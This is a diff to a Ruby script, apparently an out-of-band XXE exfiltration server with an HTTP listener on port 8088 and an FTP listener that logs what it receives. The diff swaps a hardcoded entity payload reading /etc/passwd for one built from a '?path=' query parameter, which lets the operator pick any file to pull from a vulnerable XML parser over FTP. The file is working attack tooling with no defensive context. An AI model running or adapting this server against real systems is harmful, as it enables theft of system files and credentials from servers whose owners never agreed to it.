@@ -5,7 +5,6 @@ http_server = TCPServer.new 8088
 
 log = File.open( "xxe-ftp.log", "a")
 
-payload = '<!ENTITY % asd SYSTEM "file:///etc/passwd">'
 
 Thread.start do
 loop do
@@ -15,9 +14,12 @@ loop do
 		req = http_client.gets()
 		break if req.nil?
 		if req.start_with? "GET"
+			path = req.scan(/\?path=(.*) /)
+			puts path
+			payload = "<!ENTITY % asd SYSTEM \"file://#{path}\">"
 			http_client.puts("HTTP/1.1 200 OK\r\nContent-length: #{payload.length}\r\n\r\n#{payload}")	
 		end
-		puts req
+		
 	}  
 	puts "HTTP. Connection closed" 
   end
@@ -35,7 +37,7 @@ loop do
 		break if req.nil?
 		puts "< "+req
 		log.write "get req: #{req.inspect}\n"
-		
+
 		if req.include? "LIST"
 			ftp_client.puts("drwxrwxrwx 1 owner group          1 Feb 21 04:37 test")
 			ftp_client.puts("150 Opening BINARY mode data connection for /bin/ls")
